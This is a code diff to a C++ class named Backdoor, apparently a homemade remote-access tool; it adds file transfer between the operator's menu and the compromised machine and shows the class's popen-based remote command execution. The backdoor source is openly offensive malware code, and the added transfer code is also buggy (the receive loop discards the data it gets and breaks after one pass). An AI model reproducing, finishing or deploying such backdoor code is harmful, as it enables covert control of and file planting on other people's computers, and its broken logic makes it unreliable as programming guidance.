@@ -61,9 +61,35 @@ void Backdoor::shell(){
 
 void Backdoor::upload(const char * path){
     if(this->is_server){
+        char sdbuf[512]; 
+        FILE *f = fopen(path, "r");
 
+        this->c->send_message(this->sock, path); // SOCK ??
+
+        bzero(sdbuf, 512); 
+        int fs_block_sz; 
+        while((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, f)) > 0)
+        {
+            this->c->send_message(this->sock, sdbuf);
+            bzero(sdbuf, LENGTH);
+        }
     }else{
-
+        char revbuf[LENGTH];
+        char * filename = this->c->recv_message(this->sock);
+        FILE *f  = fopen(filename, "w");
+        bzero(revbuf, LENGTH);
+        int fr_block_sz = 0;
+        while(this->c->recv_message(this->sock)){
+            int write_sz = fwrite(revbuf, sizeof(char), fr_block_sz, f);
+            if(write_sz < fr_block_sz){
+                Error::log_error("File write failed on server.\n");
+            }
+            bzero(revbuf, LENGTH);
+            if (fr_block_sz == 0 || fr_block_sz != 512) {
+                break;
+            }
+        }
+        fclose(f); 
     }
 }
 
@@ -107,8 +133,15 @@ void Backdoor::menu(){
                 std::string path;
                 std::cout << "Path: ";
                 std::getline(std::cin, path);
-                this->c->send_message(this->sock, "3");
-                this->upload(path.c_str());
+                FILE *f = fopen(path.c_str(), "rb");
+                if(f != NULL){
+                    this->c->send_message(this->sock, "3");
+                    this->upload(path.c_str());
+                    fclose(f);
+                }else{
+                    Error::log_error("Arquivo inexistente na sua maquina.");
+                }
+
             }else if(choice == 4){
                 return;
             
@@ -247,6 +280,7 @@ char * Backdoor::execute_command(const char *command){
     pclose(fpipe);
     return output;
 }
+
 
 Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->sock = sock;
